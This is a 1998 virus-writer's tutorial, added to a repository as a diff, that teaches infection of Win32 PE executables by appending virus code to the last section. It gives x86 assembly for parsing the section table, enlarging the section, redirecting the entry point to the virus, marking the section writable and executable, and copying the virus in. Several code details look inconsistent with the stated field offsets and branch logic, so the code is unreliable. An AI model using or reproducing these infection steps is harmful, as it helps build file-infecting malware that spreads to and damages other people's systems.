@@ -1,0 +1,323 @@
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´ WIN32 PE INFECTION TUTORIAL ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+                        ÀÄÄÄÄÄÄÄÄÄ´ By Qozah ÃÄÄÄÄÄÄÄÄÙ
+
+
+
+    Objectives on this article
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+    I wrote this article just a bit later than when I started infecting PE,
+ as all concepts were clear in mind, specially the things I felt most
+ difficult when working it out. The infection method described consists
+ on adding the virus to the file's last section, but the thing is that you
+ GET how it works. If you get it, you can make any kind of variation you
+ want, such as adding another section, infecting .reloc space, etc etc.
+ You can copy&paste a PE infection, but then you will never know how they
+ do work, and that's the thingie.
+
+    I hope this helps: I wrote it with the intention on you to learn, so if
+ you do I've accomplished my objective.
+
+
+    PE format
+    ~~~~~~~~~
+
+    You have a lot of resources to know how PE format is; anyway, the best
+ is probably Matt Pietrek's, which you can download on Griyo/29A's homepage.
+
+    PE is structured this way:
+
+   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+   ³     MZ Header     ³
+   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
+   ³      PE\0\0       ³
+   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
+   ³ IMAGE_FILE_HEADER ³
+   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
+   ³                   ³¿
+   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´³IMAGE_OPTIONAL_HEADER
+   ³   Data directory  ³Ù
+   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
+   ³   Section Table   ³
+   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
+   ³                   ³
+   ³     Sections      ³ÄÄÄ .reloc, .edata, .idata, .text, etc
+   ³                   ³
+   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+
+    So in a small brief, I can tell you there is a DOS header ( where there
+ is also the program which is loaded to tell you "this is win32, you asshole"
+ when you try to execute it under a non-win32 system ), then the Image
+ File Header ( the main one ), then the Image Optional Header ( which can
+ be considered divided in two parts ), the the Section Table and finally
+ the sections' data ( can be stack ones, code, data, etc ).
+
+
+    Infecting a PE file
+    ~~~~~~~~~~~~~~~~~~~
+
+    Well, you're supposed to have opened a suitable file for infection: I
+ don't mind if you use file mapping or pointer access ( yuck! ), but at
+ this point you should have done it. I suppose that you have in edx
+ ( why not ? ) the pointer to the begging of the memory mapped file.
+
+    So, the first thing you have to do is locale the PE header, and this
+ is done by looking at the 03ch offset in the MZ header. If you want
+ to do some tests, look if ds:[dx] is 'MZ' or 'ZM':
+
+    cmp     word ptr ds:[edx],'M'+'Z'
+    jz      end_infection
+    mov     edx,dword ptr ds:[edx+3ch]      ; Offset of real PE header
+
+    Now your next objective would be checking if you have a real Portable
+ Executable file there. you can just do that by checking the four first
+ bytes on the new offset to be "PE\0\0", that is, PE and two zeroed bytes
+ :-P.
+
+    cmp     word ptr ds:[edx],'EP'
+    jz      end_infection
+
+    So now the real fun begins, and you have to mess with the diverse
+ stuff in the PE. Instead of giving lots of code, what I want is to make
+ you UNDERSTAND what the hell is going on there. I don't want this full
+ of people working the same infection by copying this code I'm setting,
+ but knowing what to do when they want to perform one.
+
+    First you have to locate which PE section is the last. After the EXE
+ header and the Image Header there's the OptionalHeader... and finally, we
+ can find the Section Table, that is, where a description and some data
+ on each section is found. If we want to add our code to the last section,
+ modifying this table is truly neccesary
+
+    The first problem some coders have is... how do I access the Section
+ Table ? Well, there are two ways:
+
+    - The image File Header has a fixed number of bytes, that is, 18h. So,
+ to find the Image Optional Header we just have to add to our old edx that
+ number of bytes. Then, we know the Section Table is just AFTER the
+ Image Optional Header, but it doesn't have a fixed length.
+
+       First way is more complicated and not better; the IOH has two parts,
+ the first one of fixed length: 60h bytes. This part is the one which
+ contains some fields with important data for the file. The second part
+ is not fixed length, and is called data directory or "Image_Data_Directory"
+ also. This table is an array of entries, which contains RVAs and some
+ other stuff which I won't describe here. The stuff is, that you can
+ take it's length by watching the offset 74h from the PE\0\0 ( that is, the
+ EDX we had ) and then access the Section Table: that offset, which is the
+ last field on the Image_Optional_Header first part, is called as
+ "NumberOfRvaAndSizes", indicating the number of entries in the Data
+ Diretory array.
+
+        But let's not complicate things. We have just a really trivial
+ method, as the length of the optional header is stored in a Word in
+ offset 14 from the "PE\0\0" ( have I again to repeat it would be DX+14h? ).
+ So, we get that DX in example, pass it to SI, add it 18h ( so SI points
+ to the beggining of the optional header ), and then add the Word on the
+ offset DX+14h ( which is called SizeOfOptionalHeader ;-) ) to that SI.
+
+        Then, keep in mind now we have DX in the PE\0\0, and SI points to
+ the beggining of the Section Table.
+
+    mov     esi,edx
+    add     esi,18h
+    add     esi,dword ptr [edx+14h]
+
+
+    So, as this is done, now we have to find the last section. The
+ structure we're pointing at is an array which contains all sections in
+ a specific format, beeing 28h bytes each of them.
+
+    Place   Length  What the hell is it
+
+    0h      8h      Section's name ( .edata, .reloc, .p0rn )
+    8h      4h      VirtualSize
+    0ch     4h      SizeOfRawData
+    14h     4h      PointerToRawData
+    18h     4h      PointerToRelocations
+    1ch     4h      PointerToLinenumbers
+    20h     2h      NumberOfRelocations
+    22h     2h      NumberOfLinenumbers
+    24h     4h      Characteristics
+
+    At this point, as you know you want to make the last section bigger,
+ you could think that last section is the last array also. False, yep, it
+ doesn't have to be. How to know it then ? Well, we have one field that is
+ called "PointerToRawData", that is, a pointer to that section's code to
+ say it easy. So, just you have to check all section entries, and that
+ with the biggest PointerToRawData is the one we want.
+
+    Of course, we have to know the number of sections... from PE\0\0, it's
+ the offset 6h, the Word which contains that number:
+
+    xor     ecx,ecx
+    mov     cx,word ptr ds:[edx+06h]   ; number of sections
+    mov     edi,esi
+    xor     eax,eax
+    push    cx
+X_Sections:
+    cmp     dword ptr [edi+14h],eax     ; is PointerToRaw bigger than actual?
+    jz      Not_Biggest
+    mov     ebx,ecx                     ; put the number of section in ebx
+    mov     eax,dword ptr [edi+14h]     ; get that pointer
+Not_Biggest:
+    add     edi,28h                     ; look at next table entry
+    loop    X_Sections
+
+    pop     cx                          ; Now, substract where we found it
+    sub     ecx,ebx                     ;to the number of sections.
+
+
+    Now on ecx we have a number that will be 0 for the first section, 1 for
+ the second, etc. We just multiply it by 28h ( which is the length of any
+ of the table entries, each section ) and adding it to esi we get that
+ desired last section:
+
+    mov     eax,028h
+    push    edx                         ; Save PE header
+    mul     ecx
+    pop     edx
+    add     esi,eax
+
+    So, we have to act on that section of the file. There are three things
+ I've got to describe so you get the point, beeing them fields on the
+ Section Table entry we're at ( look above if you don't remember them )
+
+    - VirtualSize is the real size of the section, the number of bytes of
+ that section.
+
+    - SizeOfRawData is the same that VirtualSize BUT rounded up to the
+ alignment.
+
+    - Alignment ( this is placed in OptionalHeader, not in these fields in
+ the specific section entry as it's same for all ) is a size which the file
+ size in the PE Header and the SizeOfRawData field have to be divided by.
+
+    For example, let's imagine we have a section which has a VirtualSize
+ of 1256h bytes, while the Alignment field in the Optional Header contains
+ then number 200h. Then, we can easily know that the field in
+ SizeOfRawData HAS to be 1400h. Why ? Because we have to round UP that
+ 1256h to it's nearest value that is divisible by the Alignment, that is,
+ 200h.
+
+    So, as now you know how do these three data fields work, the next part
+ can't be that difficult. The next objective is making the section bigger
+ so your virus can fit there. For that reason, you should add the virus
+ size to the VirtualSize field first of it all.
+
+    mov     edi,dword ptr ds:[esi+10h]  ; Save PointerToRawData ( that's
+                                        ;for future use when setting EP )
+    mov     eax,virlength
+    xadd    dword ptr ds:[esi+8h],eax   ; Exchange and add to destiny
+    push    eax
+    add     eax,virlength              ; Now eax = [esi+8h], that is,
+                                        ;field 8h plus vir_length
+
+    Now the VirtualSize has grown, so the SizeOfRawData should be wrong.
+ Imagine that the old VirtualSize was 556h while the Alignment was 200h,
+ and the SizeOfRawData 600h... if your virus is 800h bytes long, the
+ new VirtualSize will be 0d56h, so SizeOfRawData is incorrect: it's value
+ has to be the VirtualSize rounded up to a value that can be divided by
+ the Alignment; in this case, it should be 0e00h ( which can be divided
+ by 200h, and is the nearest one rounded up that can be )
+
+    Let's watch some code:
+
+    push    edx
+    mov     ecx, dword ptr ds:[edx+03ch] ; Here is the alignment
+    xor     edx,edx
+    div     ecx         ; eax held virtual size.
+    xor     edx,edx
+    inc     eax         ; This is the quotient of the VirtualSize divided
+                        ;with the Alignment plus 1.
+    mul     ecx         ; And we multiply the Alignment plus eax, so we
+                        ;get the new SizeOfRawData
+    mov     ecx,eax
+    mov     dword ptr ds:[esi+10h],ecx  ; now here is the SizeOfRawData
+    pop     edx
+
+    Well, this is going cool, isn't it ? Now you have calculated the new
+ SizeOfRawData and stored it. What are you going to do now ? You just
+ get a value I pushed before which is VirtualSize before beeing modified
+ by the virus ( 8h field ), and you are getting your new entry point.
+
+    pop     ebx         ; This is VirtualSize - virlength
+
+    That is, VirtualSize before beeing added the virlength :)
+
+    Now is when you save the old entry point address, which is in the
+ offset 28h starting from the PE\0\0 thingie. Not much left to say, but
+ how do you get the new entry point ?
+
+    Let's hear what our friend Mark Ludwig in the description of offset
+ 0ch of any entry at the Section Table:
+
+    0ch DWORD   VirtualAddress
+
+        In EXE's, this field holds the RVA for where the loader should map
+     the section to. To calculate the real starting address of a given
+     section in memory, add the base address of the image to the
+     section's VirtualAddress stored in this field. [etc]
+
+    Well, it can't be easier, can it ? We take the VirtualAddress of the
+ section, then add it the OLD section length and voila ! we just have
+ the end of it... the new entry point :)
+
+    add     ebx,dword ptr ds:[esi+0ch]          ; VirtualAddress
+    mov     eax,dword ptr ds:[edx+028h]         ; Old entry point
+    mov     dword ptr ds:[ebp+entry_point],eax
+    mov     dword ptr ds:[edx+28h],ebx          ; Set new one
+
+    Again, we have to calculate the file length aligned: this is for the
+ whole file, not just the last section. So, using the new SizeOfRawData
+ and substracting it the old one, you know the aligned value of
+ how much has it grown. Just add it to the SizeOfImage field and you
+ get the new aligned filesize. Looking at the code above, we had in ecx
+ the SizeOfRawData, which we substract from the value in edi, that is,
+ what we saved before that consists on the olf SizeOfRawData
+
+    sub     ecx,edi
+    add     dword ptr ds:[edx+50h],ecx ; add to SizeOfImage
+
+    Finally, we set the Characteristics field from the Section Table
+ entry. You won't want it to give you problems, aha ? There are lot of
+ flags that can be set in that field ( which is offset 24h on each
+ table entry ) as code, initialized data, uninitializeddata, not needed,
+ executable, etc.
+
+    We want to make it executable, code and writable, so we have
+ to OR it with 0x00000020 (code), 0x20000000 ( executable ) and
+ 0x80000000 ( writable ).
+
+    or      dword ptr ds:[esi+24h],0A0000020h
+
+    Now we just have to copy our virus to the file. By popping edi
+ I'm getting the old memory mapped file pointer in memory ( where it
+ is right now ), which is the beggining of it ( MapViewOfFile returns
+ a "handle" which is it's base address ). It must have been saved cuz if
+ not you wouldn't close the mapped object <g>. You have to add to this
+ the PointerToRawData where it says where the section is, then
+ add section's old length ( cuz you're at the end of it ).
+
+    pop     edi
+    push    edi
+    add     edi,dword ptr ds:[esi+14h]
+    add     edi,dword ptr ds:[esi+8h]
+    mov     ecx,virlength
+    sub     edi,ecx                   ; old length ;)
+    lea     esi,[ebp+starts]          ; Where the virus starts
+    rep     movsb
+
+    So, there's nothing left to do. We have calculated the size, we
+ have changed the entry point, and saved it; other stuff is up to you.
+ The next thing you should do is returning to the host, it's important =),
+ and of course finding a way to get the GetProcAddress and GetModuleHandle
+ APIs for that second generation, but that's another story.
+
+    P.D.: Just the base address plus the old entry point, and then you, oh,
+ blah, nothing :)
+
+
+     ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+ÄÄÄÄÄ´ Written by Qozah, Finland '98 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+     ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
